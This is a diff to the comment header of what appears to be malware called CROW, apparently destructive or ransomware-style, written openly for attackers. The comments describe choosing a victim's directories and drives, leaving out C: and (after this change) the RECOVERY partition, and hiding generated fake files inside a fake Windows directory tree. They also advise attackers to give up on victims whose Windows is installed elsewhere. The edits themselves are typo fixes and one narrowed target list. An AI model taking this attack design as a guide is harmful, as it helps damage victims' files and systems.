@@ -7,7 +7,7 @@
 #  that user, it will find the directories you want to target. (You can change them in the code
 #  once you studied your victim.) After, it will attack any additional folders that you want even if they
 #  are outside of the users. (Normally used to target programs, but you can get creative if you want.)
-#  And it will list all of the drives except C: as targets. 
+#  And it will list all of the drives except C: and the "RECOVERY" partition as targets. 
 
 #  Once all of this is done it will create a fake directory tree, that looks like a component of Windows
 #  but surprise, it isn't. Inside of this fake tree there will be many fake files that are generated randomly,
@@ -51,8 +51,8 @@
 #  SIDE NOTE FOR PEOPLE WHO WANT TO USE THIS ON A VICTIM WITH WINDOWS INSTALLED IN A DRIVE OTHER THAN C:
 
 #  If windows is installed in another place than C:, CROW should work (not tested) but it will take hours to 
-#  execute the attack. This code does support the posibility of adding a Windows location detector module but 
-#  we did not implement it because this is already mandness, if you had the incredible bad luck of studying the 
+#  execute the attack. This code does support the possibility of adding a Windows location detector module but 
+#  we did not implement it because this is already madness, if you had the incredible bad luck of studying the 
 #  victim and realized that windows is installed elsewhere, just give up and go for another one, they win, it is
 #  not worth it, but if you really need to do it, you can.
 
